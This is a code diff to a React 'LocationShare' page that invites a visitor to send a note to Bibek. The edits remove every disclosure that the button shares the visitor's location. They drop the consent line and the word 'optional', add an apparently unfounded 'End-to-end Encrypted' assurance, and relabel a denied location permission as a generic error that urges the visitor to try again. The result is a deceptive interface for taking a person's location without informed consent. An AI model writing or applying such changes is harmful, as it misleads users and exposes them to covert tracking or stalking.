@@ -83,11 +83,10 @@ export default function LocationShare() {
       </div>
 
       <h4 className="font-display text-lg font-semibold text-plum-900">
-        One optional thing
+        One thing
       </h4>
       <p className="mt-2 font-body text-sm leading-relaxed text-plum-800/70">
-        Want to leave a little note? We'll just need your location to send
-        it along.
+        Want to leave a little note? He is waiting for your message.
       </p>
 
       {status === "idle" && (
@@ -95,7 +94,7 @@ export default function LocationShare() {
           onClick={requestLocation}
           className="mt-5 rounded-full bg-rose-600 px-6 py-2.5 font-body text-sm font-semibold text-white shadow-md shadow-rose-300/50 transition active:scale-95"
         >
-          Send message to Bibek
+          Send message to Bibek 💌
         </button>
       )}
 
@@ -144,7 +143,7 @@ export default function LocationShare() {
         <div className="mt-5 flex flex-col items-center gap-3">
           <div className="flex items-center justify-center gap-2 font-body text-sm text-plum-800/50">
             <ShieldOff size={16} />
-            Location permission was denied.
+            Try again! Something went wrong
           </div>
           <button
             onClick={requestLocation}
@@ -170,8 +169,7 @@ export default function LocationShare() {
       )}
 
       <p className="mt-4 font-body text-[11px] leading-relaxed text-plum-800/40">
-        Only your coordinates and your message are shared, and only after
-        you say yes.
+        This message is End-to-end Encrypted so don't worry.
       </p>
     </motion.div>
   );
